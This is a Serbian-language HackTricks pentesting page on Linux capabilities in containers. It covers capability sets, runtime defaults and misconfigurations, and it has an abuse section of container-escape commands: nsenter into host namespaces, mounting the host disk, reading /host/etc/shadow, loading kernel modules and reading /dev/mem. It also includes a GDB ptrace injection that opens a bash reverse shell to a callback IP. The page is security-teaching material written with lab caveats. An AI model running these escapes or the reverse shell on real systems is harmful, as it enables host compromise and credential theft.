# Linux Capabilities U Kontejnerima

{{#include ../../../../banners/hacktricks-training.md}}

## Pregled

Linux capabilities su jedan od najvažnijih delova bezbednosti kontejnera jer odgovaraju na suptilno, ali suštinsko pitanje: **šta „root” zaista znači unutar kontejnera?** Na uobičajenom Linux sistemu, UID 0 je istorijski podrazumevao veoma širok skup privilegija. U modernim kernelima, te privilegije su razložene na manje jedinice koje se nazivaju capabilities. Proces može da radi kao root, a da mu i dalje nedostaju mnoge moćne operacije ako su mu uklonjene odgovarajuće capabilities. <sup>[[1]](#references)</sup>

Kontejneri se u velikoj meri oslanjaju na ovu razliku. Mnoga radna opterećenja i dalje se pokreću kao UID 0 unutar kontejnera iz razloga kompatibilnosti ili jednostavnosti. Bez uklanjanja capabilities, to bi bilo previše opasno. Kada se capabilities uklone, root proces u kontejneru i dalje može da obavlja mnoge uobičajene zadatke unutar kontejnera, a da mu se istovremeno uskrate osetljivije operacije kernela. Zato to što kontejnerska komandna linija prikazuje `uid=0(root)` ne znači automatski „host root”, niti čak „široke privilegije kernela”. Skupovi capabilities određuju koliko ta root identifikacija zaista vredi.

Za potpunu referencu o Linux capabilities i mnoge primere zloupotrebe pogledajte:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Rad

Capabilities se prate u nekoliko skupova, uključujući permitted, effective, inheritable, ambient i bounding. Za mnoge procene kontejnera, tačna semantika svakog skupa na nivou kernela manje je važna od konačnog praktičnog pitanja: **koje privilegovane operacije ovaj proces trenutno može uspešno da izvrši i koje buduće sticanje privilegija je još uvek moguće?** <sup>[[1]](#references)</sup>

Ovo je važno zato što su mnoge tehnike bekstva zapravo problemi sa capabilities koji se predstavljaju kao problemi kontejnera. Radno opterećenje sa `CAP_SYS_ADMIN` može da pristupi velikom delu funkcionalnosti kernela koju uobičajeni root proces u kontejneru ne bi trebalo da koristi. Radno opterećenje sa `CAP_NET_ADMIN` postaje mnogo opasnije ako deli host network namespace. Radno opterećenje sa `CAP_SYS_PTRACE` postaje mnogo zanimljivije ako može da vidi host procese putem deljenja host PID-a. U Dockeru ili Podmanu to može da bude prikazano kao `--pid=host`; u Kubernetesu se obično prikazuje kao `hostPID: true`.

Drugim rečima, skup capabilities ne može da se procenjuje izdvojeno. Mora da se posmatra zajedno sa namespaces, seccomp-om i MAC politikom.

## Laboratorija

Veoma direktan način da pregledate capabilities unutar kontejnera je:

```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```

Možete uporediti i restriktivniji kontejner sa onim kojem su dodate sve capabilities:

```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

Da biste videli efekat ograničenog dodavanja, pokušajte da uklonite sve, pa vratite samo jednu capability:

```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

Ovi kratki eksperimenti pokazuju da runtime ne menja samo vrednost logičke promenljive koja se zove „privileged“. On oblikuje stvarnu površinu privilegija dostupnu procesu.

## Visokorizične capabilities

Capabilities postaju primitivni za bekstvo iz kontejnera samo kada njihova operacija dosegne **resurs kojim upravlja host**. Česte visokorizične kombinacije su:

- **`CAP_SYS_ADMIN`** uz PID hosta, blok-uređaj ili putanju za upis u kernel kontrolu. Za pridruživanje ciljnom mount namespace-u dodatno je potreban `CAP_SYS_CHROOT`; za montiranje sistema datoteka zasnovanog na blok-uređaju potreban je `CAP_SYS_ADMIN` u početnom korisničkom namespace-u.
- **`CAP_SYS_PTRACE`** uz vidljivost PID-ova hosta i proces hosta kojem se može prikačiti. Za ptrace ubacivanje nije potreban `CAP_SYS_ADMIN`.
- **`CAP_DAC_OVERRIDE` ili `CAP_DAC_READ_SEARCH`** uz dostupan sistem datoteka hosta. Ove capabilities zaobilaze različite DAC provere, ali ne obezbeđuju prikaz sistema datoteka hosta.
- **`CAP_SYS_MODULE`** u početnom korisničkom namespace-u uz prihvaćen modul kompatibilan s kernelom. Obični Linux kontejneri dele kernel čvora; VM ili runtime-i s userspace kernelom menjaju tu granicu.
- **`CAP_MKNOD`** u početnom korisničkom namespace-u uz stvarni uređaj hosta koji cgroup uređaja već dozvoljava. Kreiranje čvora ne zaobilazi cgroup uređaja.
- **`CAP_SYS_RAWIO`** uz izložen i upotrebljiv interfejs za memoriju, I/O port, PCI ili kontrolu uređaja.
- **`CAP_SYS_BOOT`** uz početni PID namespace za ponovno pokretanje hosta ili upotrebljivu i dozvoljenu kexec putanju za zamenu kernela.
- **`CAP_NET_ADMIN`** u mrežnom namespace-u hosta za direktnu kontrolu mrežnog stanja čvora. **`CAP_NET_RAW`** može biti deo bekstva specifičnog za određeni protokol, ali raw sockets sami po sebi ne daju shell na čvoru.

`CAP_SYS_CHROOT` namerno nije naveden kao samostalna capability za bekstvo. Može biti potreban za `setns()` u mount namespace i može olakšati korišćenje već dostupnog stabla hosta, ali sam `chroot()` ni ne izlaže to stablo ni ne dodeljuje nove dozvole za sistem datoteka. Slično tome, `CAP_BPF` i `CAP_PERFMON` izlažu moćnu telemetriju i površinu za napad na kernel, ali njihove uobičajene operacije nisu generička bekstva iz kontejnera ako ne postoji zaseban propust u kernelu.

## Upotreba runtime-a

Docker, Podman, stekovi zasnovani na containerd-u i CRI-O koriste kontrolu capabilities, ali se podrazumevane vrednosti i interfejsi za upravljanje razlikuju. Docker ih izlaže direktno pomoću zastavica kao što su `--cap-drop` i `--cap-add`. Podman nudi slične kontrole i često ih kombinuje s rootless izvršavanjem kao dodatnim slojem zaštite. Kubernetes dodavanje i uklanjanje capabilities prikazuje kroz `securityContext` Pod-a ili kontejnera; runtime-i nižeg nivoa izražavaju dobijene skupove u OCI konfiguraciji runtime-a. Okruženja za sistemske kontejnere, kao što su LXC i Incus, takođe se oslanjaju na kontrolu capabilities, ali njihova šira integracija s hostom može navesti operatere da labave podrazumevane postavke više nego što bi to učinili za kontejner aplikacije. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

Isto načelo važi za sve njih: capability koju je tehnički moguće dodeliti ne treba nužno i dodeliti. Mnogi incidenti u stvarnom svetu počinju tako što operater doda capability samo zato što workload nije radio uz strožu konfiguraciju, pa je timu bilo potrebno brzo rešenje.

## Pogrešne konfiguracije

Najočiglednija greška je **`--cap-add=ALL`** u CLI alatima kao što su Docker i Podman, ali nije jedina. U praksi je češći problem dodeljivanje jedne ili dve izuzetno moćne capabilities, naročito `CAP_SYS_ADMIN`, da bi „aplikacija radila“, bez razumevanja posledica po namespace-ove, seccomp i mount-ove. Još jedan čest problem je kombinovanje dodatnih capabilities s deljenjem host namespace-ova. U Docker-u ili Podman-u to može izgledati kao `--pid=host`, `--network=host` ili `--userns=host`; u Kubernetes-u se odgovarajuća izloženost obično javlja kroz postavke workload-a, kao što su `hostPID: true` ili `hostNetwork: true`. Svaka od tih kombinacija menja ono na šta capability zaista može da utiče.

Često se dešava i da administratori veruju da je workload i dalje značajno ograničen zato što nije u potpunosti `--privileged` režimu. Ponekad je to tačno, ali ponekad je efektivno bezbednosno stanje već toliko blizu privilegovanom da ta razlika operativno prestaje da bude važna.

## Zloupotreba

Počnite beleženjem efektivnih skupova, mapiranja korisničkog namespace-a, stanja seccomp-a, namespace-ova, mount-ova i uređaja. Naziv capability-ja bez ovog konteksta ne dokazuje bekstvo iz kontejnera:

```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```

### `CAP_SYS_ADMIN`: imenski prostori i blok uređaji

Uz vidljivost PID-ova hosta, `CAP_SYS_ADMIN` može da uđe u imenske prostore hosta. Operacija sa imenskim prostorom za montiranje takođe zahteva `CAP_SYS_CHROOT` u korisničkom imenskom prostoru pozivaoca.

**Proverite capability i ograničenja:**

```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```

**Popišite cilj:** potvrdite deljenje host PID-a na osnovu konfiguracije container-a/Pod-a ili nedvosmislenog spiska host procesa, a zatim pregledajte ciljne imenske prostore. Lokalni PID 1 postoji i u privatnim PID imenskim prostorima, pa samo njegovo prisustvo ne dokazuje deljenje host PID-a.

```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```

**Iskoristite putanju namespace-a:**

```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```

Provere capabilities moraju uspeti u korisničkim imenskim prostorima koji poseduju ciljeve. `--pid=host` ili Kubernetes `hostPID: true` omogućava vidljivost; ne obezbeđuje capabilities.

Za alternativni put preko blok-uređaja, **enumerate** kandidate, a zatim **exploit** dostupni datotečni sistem tako što ćete prvo montirati validiranog kandidata samo za čitanje:

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```

Čvor uređaja mora da postoji, cgroup uređaja mora da ga dozvoljava, a za montiranje blokovskih sistema datoteka potreban je `CAP_SYS_ADMIN` u početnom user namespace-u. Host root koji je već bind-mounted na `/host` omogućava pristup hostu **bez** `CAP_SYS_ADMIN`; `chroot /host` je samo pogodnost i zasebno zahteva `CAP_SYS_CHROOT`.

### Dostupan host root: direktno izvršavanje iz sistema datoteka

Ako je host root već montiran na `/host`, prvo proverite montiranje, a zatim direktno koristite postojeći pristup. Ovaj pristup ne zavisi od `CAP_SYS_ADMIN`:

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```

Ako `chroot()` nije dostupan, ali je binarni fajl hosta kompatibilan sa arhitekturom i loaderom kontejnera, često se može pozvati preko montiranog stabla:

```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```

Direktno čitanje i pisanje u okviru `/host` već predstavlja kompromitovanje host fajl-sistema. `chroot()` ili izvršavanje host binarnog fajla samo olakšava taj pristup; nijedna od tih operacija ne kreira host mount niti zaobilazi read-only mount ili MAC pravila.

### `CAP_SYS_PTRACE`: host-process injection

Uz vidljivost host PID-ova i `CAP_SYS_PTRACE` u korisničkom namespace-u cilja, GDB može da natera odobreni host proces da pozove `system()`. `CAP_SYS_ADMIN` nije potreban.

**Proverite capability i kontrole za attach:**

```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```

**Izlistajte i izaberite cilj koji se može bezbedno žrtvovati:** potvrdite deljenje PID-ova sa hostom na osnovu konfiguracije ili nedvosmislenog spiska procesa na čvoru; nikada ne birajte PID 1 niti kritični demon.

```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
  "/proc/${target_pid}/status"
```

**Exploitujte odabrani proces:**

```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
  -ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
  -ex detach
```

Ciljni proces mora da podržava attach i da ima upotrebljiv simbol `system()` i putanju do Bash payload-a. Yama, non-dumpable stanje, seccomp, user namespaces i MAC policy mogu da blokiraju ovaj lanac. GDB zaustavlja ciljni proces dok je povezan, zato koristite samo proces iz disposable lab okruženja.

### `CAP_DAC_OVERRIDE` i `CAP_DAC_READ_SEARCH`: zaštićene host datoteke

Ove capabilities ne izlažu host filesystem. Ako je `/host` već host mount, `CAP_DAC_READ_SEARCH` može da zaobiđe DAC provere čitanja/pretrage, a `CAP_DAC_OVERRIDE` može dodatno da zaobiđe uobičajene provere pisanja:

**Proverite capabilities:**

```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**Izlistajte izloženi fajl-sistem hosta i dozvole cilja:**

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
  /host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```

**Isprobajte read i write bypasses** u privremenom laboratorijskom okruženju:

```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```

Read-only mount i LSM pravila i dalje važe. `CAP_DAC_READ_SEARCH` takođe dozvoljava `open_by_handle_at()`, ali proboj poput Shocker-a dodatno zahteva mount file descriptor za isti osnovni filesystem, važeće ili moguće otkriti handles, kompatibilan raspored filesystem-a/skladišta i odsustvo blokade runtime-a ili LSM-a. Ne omogućava proizvoljan pristup svakom filesystem-u izvan mount namespace-a.

### `CAP_SYS_MODULE`: izvršavanje u deljenom kernelu

U običnom Linux kontejneru, prihvaćeni modul se izvršava u deljenom kernelu hosta.

**Proverite capability i opseg user namespace-a:**

```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Nabrojte preduslove za učitavanje modula:**

```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
  "/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```

**Exploit samo uz kompatibilan, prethodno pregledan proof modul na privremenom čvoru:**

```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```

Capability mora biti efektivan u početnom korisničkom namespace-u. Verzija i konfiguracija kernela, potpisi modula, lockdown, seccomp i LSM politika moraju dozvoljavati učitavanje. Kata, gVisor, Hyper-V isolation i slični runtime-ovi menjaju granicu kernela do koje workload dolazi.

### `CAP_MKNOD`: kreiranje dozvoljenog handle-a uređaja

`CAP_MKNOD` kreira čvor uređaja, ali ne zaobilazi device cgroup. Kreiranje uređaja nije namespaced, pa capability mora biti efektivan u početnom korisničkom namespace-u.

**Proverite capability i opseg korisničkog namespace-a:**

```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Izlistaj stvarne uređaje, njihove major/minor brojeve i sve vidljive liste dozvoljenih uređaja za cgroup-v1:**

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
  printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```

**Exploit validiranog kandidata iz ext porodice samo za čitanje:**

```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```

Ostalim sistemima datoteka potreban je odgovarajući alat samo za čitanje; za dodatno montiranje uređaja potreban je i `CAP_SYS_ADMIN`. Poruka `Operation not permitted` pri otvaranju kreiranog čvora obično ukazuje na to da cgroup za uređaje i dalje blokira pristup. U cgroup v2, pristup uređajima se obično kontroliše pomoću BPF-a, a datoteka `devices.list` ne postoji, pa je uspešno otvaranje odlučujući test.

### `CAP_SYS_RAWIO`: izloženi interfejs za direktan I/O

Ne postoji prenosiv generički payload: važeće adrese i efekti zavise od hardvera i konfiguracije kernela.

**Proverite capability i opseg korisničkog namespace-a:**

```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Popišite izložene sirove interfejse, hardver i upravljačke programe:**

```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```

**Exploit samo uz odobreni proof za identifikovani uređaj i opseg adresa.** Ako je `/dev/mem` interfejs odobren za laboratoriju, ovaj šablon dokazuje otkrivanje memorije čvora bez ispisivanja njenog sadržaja:

```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```

Adresa mora da potiče iz hardverske mape laboratorije, jer čitanje nekih MMIO regiona može imati neželjene efekte. Generička komanda za upis u memoriju bila bi obmanjujuća i nebezbedna: ista adresa na jednoj mašini može biti bezopasna, a na drugoj upravljati hardverom ili memorijom kernela. Device cgroups, dozvole sistema datoteka, stroga ograničenja za `/dev/mem`, kernel lockdown, virtuelizacija i LSM pravila često sprečavaju koristan pristup.

### `CAP_SYS_BOOT`: ponovno pokretanje namespace-a ili zamena kernela

U privatnom PID namespace-u, `reboot()` prekida init proces tog namespace-a, umesto da ponovo pokrene host. Zato je za uticaj na ponovno pokretanje hosta potreban početni PID namespace, obično putem deljenja PID namespace-a sa hostom. Putanja preko kexec-a takođe zahteva kompatibilnu sliku kernela i dozvoljavajuću lockdown politiku/politiku potpisa:

**Proverite capability:**

```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Nabrojte preduslove za PID namespace i kexec:** potvrdite deljenje PID prostora sa hostom na osnovu konfiguracije workload-a, jer sama veza sa PID namespace-om ne otkriva da li je to početni namespace čvora.

```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```

**Exploit samo kada je ponovno pokretanje privremenog laboratorijskog čvora izričit zadatak:**

```bash
sync
reboot -f
```

Nemojte da izvršavate tu komandu niti da učitavate kernel na zajedničkom čvoru samo da biste dokazali da imate tu capability. U privatnom PID namespace-u, ona završava samo init proces tog namespace-a i ne dokazuje uticaj na host.

### `CAP_NET_ADMIN` i `CAP_NET_RAW`: putanje do mreže hosta

`CAP_NET_ADMIN` utiče samo na trenutni network namespace.

**Proverite capabilities i ograničenja:**

```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**Izlistajte trenutnu mrežu i potvrdite host networking u konfiguraciji radnog opterećenja:**

```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```

**Reverzibilno isprobajte CAP_NET_ADMIN:** uz host networking, privremeni interfejs je interfejs čvora.

```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```

`CAP_NET_RAW` omogućava RAW i PACKET sokete, ali ne i generičku host shell sesiju. Da biste **enumerisali** dokumentovani GCE lanac, proverite rutu do metapodataka i uhvatite da li je vidljiv plaintext saobraćaj guest-agent-a:

```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```

Ako postoje odgovarajući preduslovi, **exploit**-ujte lanac specifičan za okruženje, kao što je dokumentovano u [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html): uhvatite zahtev i stanje sekvence, ubacite falsifikovani odgovor metapodataka koji sadrži SSH ključ, a zatim proverite pristup hostu. Za ovaj lanac bili su potrebni root, host networking, `CAP_NET_ADMIN`, `CAP_NET_RAW`, plaintext GCE saobraćaj metapodataka i zahtev guest agenta podložan race condition-u; savremen transport ili ponašanje agenta mogu da ga onemoguće.

### Ograničenja lokalnog porekla i adrese interfejsa

Listener može da odbije veze čija je izvorna adresa `127.0.0.1`, ali da ne proveri neku drugu adresu dodeljenu istom mrežnom namespace-u. Ako je listener dostupan preko tog interfejsa, uporedite loopback vezu sa vezom uspostavljenom preko postojeće lokalne adrese koja nije loopback. `CAP_NET_ADMIN` može da omogući konfigurisanje interfejsa u trenutnom namespace-u, ali nije neophodan ako je odgovarajuća adresa već dodeljena. `CAP_NET_RAW` nije preduslov za običnu TCP vezu. Ovo je propust u klasifikaciji izvorne adrese, a ne izlazak iz kontejnera niti dokaz da će aplikacija autorizovati privilegovani zahtev.<sup>[[1]](#references)[[7]](#references)</sup>

Kod WebSocket listenera, ispravan HTTP odgovor `101 Switching Protocols` potvrđuje da je početno rukovanje završeno; naknadna greška na nivou aplikacije može da pokaže da je veza stigla do handler-a. Nijedan od tih odgovora ne dokazuje da su autentifikacija ili tražena operacija uspeli.<sup>[[8]](#references)</sup>

## Provere

Cilj provera capability-ja nije samo ispisivanje sirovih vrednosti, već i razumevanje da li proces ima dovoljno privilegija da njegova trenutna situacija sa namespace-om i mount-ovima postane opasna.

```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```

Šta je ovde zanimljivo:

- `capsh --print` je najlakši način da uočite capabilities visokog rizika, kao što su `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` ili `cap_sys_module`.
- Linija `CapEff` u `/proc/self/status` pokazuje koje su capabilities trenutno efektivne, a ne samo koje bi mogle biti dostupne u drugim skupovima.
- Ispis capabilities postaje mnogo važniji ako kontejner deli i host PID, network ili user namespaces, ili ima upisive host mounts.

Nakon prikupljanja sirovih informacija o capabilities, sledeći korak je tumačenje. Proverite da li je proces root, da li su user namespaces aktivni, da li se dele host namespaces, da li se primenjuje seccomp i da li AppArmor ili SELinux i dalje ograničavaju proces. Sam skup capabilities samo je deo priče, ali je često upravo on razlog zašto jedan container breakout uspe, a drugi ne uspe sa istom prividnom početnom tačkom.

## Podrazumevane postavke runtime okruženja

| Runtime / platforma | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje zaštite |
| --- | --- | --- | --- |
| Docker Engine | Podrazumevano smanjen skup capabilities | Docker zadržava podrazumevanu listu dozvoljenih capabilities, a ostale uklanja | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Podrazumevano smanjen skup capabilities | Podman kontejneri su podrazumevano neprivilegovani i koriste model sa smanjenim skupom capabilities | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Nasleđuje podrazumevane postavke runtime okruženja, osim ako nisu izmenjene | Ako nisu navedene vrednosti `securityContext.capabilities`, kontejner dobija podrazumevani skup capabilities iz runtime okruženja | `securityContext.capabilities.add`, izostavljanje `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O pod Kubernetesom | Obično podrazumevane postavke runtime okruženja | Efektivni skup zavisi od runtime okruženja i Pod specifikacije | isto kao u redu za Kubernetes; direktna OCI/CRI konfiguracija takođe može eksplicitno dodati capabilities |

Za Kubernetes je važno da API ne definiše jedan univerzalni podrazumevani skup capabilities. Ako Pod ne dodaje niti uklanja capabilities, workload nasleđuje podrazumevanu vrednost runtime okruženja za taj node.

{{#include ../../../../banners/hacktricks-training.md}}

## References

- [1] [capabilities(7) - Linux stranica priručnika](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - Linux konfiguracija kontejnera](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Docker Docs - Privilegije pri izvršavanju i Linux capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Kubernetes Documentation - Podešavanje capabilities za kontejner](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Podman documentation - `--cap-add` i `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Incus documentation - Bezbednost](https://linuxcontainers.org/incus/docs/main/explanation/security/)
- [7] [ip(7) - Linux implementacija IPv4 protokola](https://man7.org/linux/man-pages/man7/ip.7.html)
- [8] [RFC 6455 - WebSocket protokol](https://www.rfc-editor.org/rfc/rfc6455.html)
